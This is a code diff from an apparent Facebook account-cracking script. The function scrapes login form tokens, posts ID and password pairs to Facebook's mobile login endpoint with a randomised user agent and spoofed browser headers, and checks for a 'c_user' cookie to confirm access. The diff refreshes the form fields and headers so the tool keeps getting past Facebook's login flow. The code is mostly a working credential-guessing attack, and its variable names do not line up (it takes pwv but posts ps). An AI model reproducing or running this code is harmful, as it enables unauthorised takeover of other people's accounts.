@@ -1196,40 +1196,23 @@ def m4(idf,pwv):
    session = requests.Session()
    ua = random.choice(usragent)
    free_fb = session.get('https://m.facebook.com').text
-   log_data ={
-             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":idf,
-            "pass":ps,
-            "login":"Log In"}
-   header_freefb = {'Host': f'm.facebook.com',
-            'Connection': 'keep-alive',
-            'Content-Length': '{len(str(logn_data))}',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-model': '"GT-414XOP"',
-            'sec-ch-ua-mobile': '?1',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
-            'viewport-width': '400',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'sec-ch-ua-platform-version': '"9.0.0"',
-            'X-ASBD-ID': '129477',
-            'dpr': '1.8',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua-platform': '"Android"',
-            'Accept': '*/*',
-            'Origin': f'https://m.facebook.com',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Dest': 'empty',
-            'Referer': f'https://m.facebook.com/login.php?skip_api_login=1&api_key=212500508799908&kid_directed_site=0&app_id=212500508799908&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
+   log_data ={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
+   header_freefb =  {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Cache-Control': 'max-age=0',
+    'Referer': 'https://mbasic.beta.facebook.com/',
+    'DNT': '1',
+    'Pragma': 'no-cache',
+    'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
    lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
